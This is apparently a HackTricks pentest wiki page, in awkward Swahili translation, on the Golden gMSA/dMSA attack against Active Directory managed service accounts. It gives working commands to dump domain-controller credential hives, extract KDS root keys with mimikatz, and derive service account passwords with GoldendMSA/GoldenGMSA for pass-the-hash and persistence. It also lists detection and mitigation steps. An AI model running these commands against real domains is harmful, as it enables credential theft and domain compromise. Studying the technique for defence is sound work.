# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Windows Managed Service Accounts (MSA) ni wakala maalum walioundwa kuendesha huduma bila haja ya kusimamia nywila zao kwa mikono.
Kuna ladha mbili kuu:

1. **gMSA** – kundi la Akaunti ya Huduma ya Usimamizi – inaweza kutumika kwenye mwenyeji wengi ambao wameidhinishwa katika sifa yake ya `msDS-GroupMSAMembership`.
2. **dMSA** – Akaunti ya Huduma ya Usimamizi iliyotolewa – mrithi (preview) wa gMSA, inategemea usimbuaji sawa lakini inaruhusu hali za ugawaji zenye granular zaidi.

Kwa toleo zote mbili **nywila haihifadhiwi** kwenye kila Kituo cha Kikoa (DC) kama hash ya kawaida ya NT. Badala yake kila DC inaweza **kuvuta** nywila ya sasa kwa wakati kutoka:

* Funguo ya KDS Root Key ya msitu mzima (`KRBTGT\KDS`) – siri yenye jina la GUID iliyozalishwa kwa bahati nasibu, iliyorejelewa kwa kila DC chini ya kontena ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Akaunti ya lengo **SID**.
* **ManagedPasswordID** (GUID) ya kila akaunti inayopatikana katika sifa ya `msDS-ManagedPasswordId`.

Uchimbaji ni: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob ya byte 240 hatimaye **imeandikwa kwa base64** na kuhifadhiwa katika sifa ya `msDS-ManagedPassword`.
Hakuna trafiki ya Kerberos au mwingiliano wa kikoa unahitajika wakati wa matumizi ya kawaida ya nywila – mwenyeji anayeshiriki anavuta nywila kwa ndani mradi unajua ingizo tatu.

## Golden gMSA / Golden dMSA Attack

Ikiwa mshambuliaji anaweza kupata ingizo zote tatu **bila mtandao** wanaweza kuhesabu **nywila halali za sasa na za baadaye** kwa **kila gMSA/dMSA katika msitu** bila kugusa DC tena, wakiepuka:

* Ukaguzi wa kusoma LDAP
* Vipindi vya kubadilisha nywila (wanaweza kuhesabu mapema)

Hii ni sawa na *Golden Ticket* kwa akaunti za huduma.

### Prerequisites

1. **Kuvunjika kwa kiwango cha msitu** cha **DC moja** (au Msimamizi wa Biashara), au ufikiaji wa `SYSTEM` kwa moja ya DCs katika msitu.
2. Uwezo wa kuhesabu akaunti za huduma (kusoma LDAP / RID brute-force).
3. .NET ≥ 4.7.2 x64 workstation ili kuendesha [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) au msimbo sawa.

### Golden gMSA / dMSA
##### Phase 1 – Extract the KDS Root Key

Dump kutoka kwa DC yoyote (Volume Shadow Copy / raw SAM+SECURITY hives au siri za mbali):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Mfuatano wa base64 uliopewa jina `RootKey` (jina la GUID) unahitajika katika hatua za baadaye.

##### Awamu ya 2 – Tambua vitu vya gMSA / dMSA

Pata angalau `sAMAccountName`, `objectSid` na `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) inatekeleza hali za msaada:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Awamu ya 3 – Kadiria / Gundua ManagedPasswordID (wakati haipo)

Baadhi ya matumizi *hutoa* `msDS-ManagedPasswordId` kutoka kwa usomaji uliohifadhiwa na ACL. 
Kwa sababu GUID ni 128-bit, brute force ya kijinga haiwezekani, lakini:

1. **Bits 32 za kwanza = wakati wa epoch wa Unix** wa uundaji wa akaunti (ufafanuzi wa dakika).
2. Imefuatiwa na bits 96 za nasibu.

Hivyo, **orodha nyembamba ya maneno kwa kila akaunti** (± masaa machache) ni halisi.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Chombo kinahesabu nywila za wagombea na kulinganisha blob yao ya base64 dhidi ya sifa halisi ya `msDS-ManagedPassword` – mechi inaonyesha GUID sahihi.

##### Awamu ya 4 – Hesabu ya Nywila ya Kazi na Ubadilishaji

Mara tu ManagedPasswordID inajulikana, nywila halali iko umbali wa amri moja:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Hashi zinazotokana zinaweza kuingizwa kwa **mimikatz** (`sekurlsa::pth`) au **Rubeus** kwa matumizi mabaya ya Kerberos, kuruhusu **lateral movement** ya siri na **persistence**.

## Detection & Mitigation

* Punguza uwezo wa **DC backup na kusoma hive ya rejista** kwa wasimamizi wa Tier-0.
* Fuata **Directory Services Restore Mode (DSRM)** au uundaji wa **Volume Shadow Copy** kwenye DCs.
* Kagua usomaji / mabadiliko ya `CN=Master Root Keys,…` na bendera za `userAccountControl` za akaunti za huduma.
* Gundua **base64 password writes** zisizo za kawaida au matumizi ya ghafla ya nywila za huduma kati ya mwenyeji.
* Fikiria kubadilisha gMSAs zenye mamlaka ya juu kuwa **akaunti za huduma za kawaida** zikiwa na mizunguko ya kawaida isiyo ya kawaida ambapo kutengwa kwa Tier-0 hakuwezekani.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – utekelezaji wa rejeleo unaotumika katika ukurasa huu.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – utekelezaji wa rejeleo unaotumika katika ukurasa huu.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket kwa kutumia funguo za AES zilizotokana.

## References

- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
